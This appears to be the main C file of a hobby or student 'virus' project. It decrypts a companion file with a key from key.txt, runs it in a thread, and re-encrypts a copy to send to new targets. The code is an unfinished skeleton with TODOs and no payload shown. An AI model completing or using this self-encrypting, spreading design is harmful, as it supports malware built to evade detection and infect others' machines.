#include "Xichigan.h"

/*********************************************************************************
* Author: Laine Rumreich								       				 				   *
*																				 							*
*																				 							*
* How to compile: make										 					 					*
* How to run: ./xichigan                 									 	 				*
**********************************************************************************/

int main(int argc, char*argv[]) {
	int ret;
	int key; // Encryption key
	FILE *fp;

	/* Initialize Space for 2 Threads */
	threads = (pthread_t *)malloc(sizeof(pthread_t)*2);
 
	/* 
		Decrypt the file XtoM.c using the key in key.txt
	*/
	// Get the key from key.txt
	fp = fopen("key.txt","r");
	fscanf (fp, "%d", &key); 
	fclose(fp);

	// Decrypt the file
	decryptFile(key);

	/*
		Create new threads to run XtoM and re-encrypt the virus to send to new targets
	*/

	// Make a copy of XtoM.c

	/* Run XtoM then TODO delete XtoM.c */
	pthread_create(&threads[0], &attribute, MtoX, NULL); /* create a new thread */

	/* Encrypt File */
	// Generate a new key and put it in the file key.txt
	key = 0; // TODO randomize

	// Encrypt the file XtoMCopy.c using the key
	pthread_create(&threads[1], &attribute, encryptFile, &key); /* create a new thread */

	// Do not explicitly wait for the threads to end
	ret = 0;
   pthread_exit(&ret);

	free(threads);
	return 0;
}


